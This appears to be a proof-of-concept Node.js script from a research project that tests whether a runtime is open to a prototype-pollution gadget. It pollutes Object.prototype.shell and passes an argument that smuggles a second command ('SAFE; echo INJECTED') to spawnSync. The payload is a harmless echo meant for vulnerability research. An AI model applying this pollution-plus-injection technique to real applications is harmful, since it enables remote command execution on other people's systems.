/**
 * probe-gadget.js — minimal, self-contained proof of the universal gadget.
 *
 * Runs the SAME experiment the paper describes (gadget G1: pollute `shell`,
 * then call a command-execution API with an argv array) and reports whether
 * the current Node runtime is vulnerable.
 *
 * Run under different runtimes to compare, e.g.:
 *     ./vendor/node-v16.13.1-linux-x64/bin/node scripts/probe-gadget.js
 *     node scripts/probe-gadget.js
 */
'use strict';
const { spawnSync } = require('child_process');

// A command whose "safe" argv form is a single literal argument. If a shell
// interprets it, the ';' splits it into two commands and we get two output
// lines — an unambiguous signal that spawn switched into shell mode.
const PROBE_ARGS = ['SAFE; echo INJECTED'];

function ranThroughShell() {
  const r = spawnSync('echo', PROBE_ARGS);
  const out = (r.stdout || '').toString().trim();
  return { fired: out.split('\n').length > 1, out };
}

console.log('='.repeat(60));
console.log('Silent Spring — universal gadget probe');
console.log('Node runtime :', process.version);
console.log('='.repeat(60));

const before = ranThroughShell();
console.log('\n[1] Baseline (no pollution)');
console.log('    echo argv output :', JSON.stringify(before.out));
console.log('    shell fired (RCE)?:', before.fired);

// Stage 1: pollute the prototype (what an injection sink achieves over HTTP).
Object.prototype.shell = true;
console.log('\n[2] Polluted Object.prototype.shell = true');
console.log('    {}.shell now      :', {}.shell);

const after = ranThroughShell();
console.log('    echo argv output :', JSON.stringify(after.out));
console.log('    shell fired (RCE)?:', after.fired);

const verdict = after.fired ? 'VULNERABLE' : 'MITIGATED';
console.log('\n' + '-'.repeat(60));
console.log(`VERDICT for Node ${process.version}: ${verdict}`);
console.log('-'.repeat(60));

// Emit a machine-readable line the demo runner can capture.
console.log('RESULT_JSON ' + JSON.stringify({
  node: process.version,
  baselineFired: before.fired,
  pollutedFired: after.fired,
  verdict,
}));

process.exit(after.fired ? 0 : 0);
